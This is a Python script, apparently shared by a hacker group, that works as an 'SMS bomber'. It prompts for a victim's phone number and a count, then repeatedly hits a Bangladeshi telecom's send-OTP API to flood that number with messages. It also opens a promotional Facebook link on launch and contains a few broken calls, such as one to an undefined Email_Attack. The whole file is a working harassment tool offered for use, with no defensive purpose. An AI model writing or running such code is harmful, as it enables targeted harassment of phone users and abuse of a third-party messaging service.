#!/usr/bin/python3
#!/coded/by/@DARK_HACKER_BD
# UPDATED ON > 25/07/2024
# JOIN > https://www.facebook.com/love.you.orny
'''
- DARK HACKER BD 💝
'''

import json, random, os, sys, logging
from time import sleep as sleep
from os import system as sys
try:
    import requests, rich
except:
    sys('pip install requests rich')
import requests, rich, socket, platform
from rich import print_json as jx

class DARK_HACKER_JAHID:
    def CLR(): sys('clear')
    def Line(): print(45*'━')
    def Back():
        DARK_HACKER_JAHID.Main()
    def Main():
        DARK_HACKER_JAHID.DARK_LG()
        DARK_HACKER_JAHID.DARK_OP()
    def GET_Dev():
        sys('xdg-open https://www.facebook.com/love.you.orny')
        sleep(2); DARK_HACKER_JAHID.Back()
    def GET_Chnl():
        sys('xdg-open https://www.facebook.com/love.you.orny')
        sleep(2); DARK_HACKER_JAHID.Back()
    def GET_Exit():
        print('- Thanks For Using'); exit()
    def GET_Value_Error_Number():
        DARK_HACKER_JAHID.Line()
        print("- Invalid Number ! Try Again")
    def GET_Value_Error_Amount():
        DARK_HACKER_JAHID.Line()
        print("- Invalid Amount ! Try Again")
    def GET_Requests_Error():
        print('- Requests Error ! Cheak Internet \n'); exit()
    def GET_Option_Not_Found():
        print('- Option Not Found ! Try Again')
        sleep(1); DARK_HACKER_JAHID.Back()
    def GET_Enter_To_Back_Main():
        DARK_HACKER_JAHID.Line()
        input("(>) PRESS ENTER TO BACK MENU ")
        DARK_HACKER_JAHID.Main()
    def DARK_OP():
        print("""[1] SMS BOOMBER""")
        DARK_HACKER_JAHID.Line()
        drk = input('[+] Your Choice : ')
        DARK_HACKER_JAHID.Line()
        if drk in ['01','1']: DARK_HACKER_JAHID.SMS_Attack()
        else: DARK_HACKER_JAHID.GET_Option_Not_Found()
     
    def SMS_Attack():
        DARK_HACKER_JAHID.DARK_LG()
        phone = input('(+) ViCTIM NUMBER : ')
        DARK_HACKER_JAHID.Line()
        try:
            amo = int(input('(+) BOOMB AMOUNT : '))
        except ValueError:
            DARK_HACKER_JAHID.GET_Value_Error_Amount()
            sleep(2); DARK_HACKER_JAHID.Email_Attack()
        DARK_HACKER_JAHID.Line()
        api = 'https://eshop-api.banglalink.net/api/v1/customer/send-otp'
        data = {
            "type": "phone",
            "phone": phone}
        headers = {
            "Host": "eshop-api.banglalink.net",
            "Connection": "keep-alive",
            "Content-Length": "",
            "User-Agent": "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://eshop.banglalink.net",
            "X-Requested-With": "mark.via.gp",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://eshop.banglalink.net/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}
        for dark in range(amo):
            try:
                lmnx9 = requests.post(api, params=data).json()
            except requests.RequestException:
                DARK_HACKER_JAHID.GET_Requests_Error()
            jx(data=lmnx9)
            DARK_HACKER_JAHID.Line()
        print("(>) BOOMBING COMPLETE")
        DARK_HACKER_JAHID.GET_Enter_To_Back_Main()
        
    def DARK_LG():
        DARK_HACKER_JAHID.CLR()
        print("""\033[38;5;205m\033[1m
🤍 DARK HACKER BD 🤍\n
 ╦  ╔═╗  ╦ ╦  ╦  ╔╦╗  ╦ ╦  ╦  
 ║  ╠═╣  ╠═╣  ║   ║║  ║ ║  ║  
╚╝  ╩ ╩  ╩ ╩  ╩  ═╩╝  ╚═╝  ╩═╝""")
        DARK_HACKER_JAHID.Line()

class URLOpener:
    def __init__(self, url):
        self.url = url

    def open(self):
        try:
            # সিস্টেম অনুযায়ী URL ওপেন করা
            if platform.system() == "Windows":
                os.system(f'start {self.url}')
            elif platform.system() == "Darwin":  # macOS
                os.system(f'open {self.url}')
            elif platform.system() == "Linux":
                os.system(f'xdg-open {self.url}')
            else:
                print("Unsupported OS")
        except Exception as e:
            print(f"An error occurred: {e}")

# উদাহরণ ব্যবহার
if __name__ == "__main__":
    url = "https://www.facebook.com/love.you.orny"
    opener = URLOpener(url)
    opener.open()

def GET_ip():
    ip = ''.join((str(random.randint(0, 9)) for _ in range(10)))
    port = random.randint(10000, 99999)
    return f'{ip}:{port}'
    
if __name__ == '__main__':
    DARK_HACKER_JAHID.Main()
